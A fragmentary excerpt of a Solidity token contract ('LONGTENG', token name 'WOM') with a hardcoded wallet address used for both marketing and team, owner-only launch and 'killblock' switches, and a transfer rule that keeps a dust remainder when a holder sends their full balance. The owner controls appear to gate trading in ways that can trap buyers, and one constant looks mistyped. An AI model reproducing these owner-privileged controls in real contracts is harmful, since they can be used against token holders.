...
contract LONGTENG is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "WOM";
    ...
    address payable public marketingWalletAddress = payable(0x35d3DCf0B7Ba8747Ad61E54D18f5684bbeef0439); // Marketing Address
    address payable private teamWalletAddress = payable(0x35d3DCf0B7Ba8747Ad61E54D18f5684bbeef0439); // Team Address
    ...
    uint256 private minimumTokensBeforeSwap = 1 * 3 **_decimals; 
    ...
    function come() public onlyOwner {
        isLaunch = true;
    ...
    function sk(uint num) public onlyOwner {
        killblock = num;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(amount == balanceOf(sender)) {
            amount = amount.sub(0.00000000000000001 ether);
        }
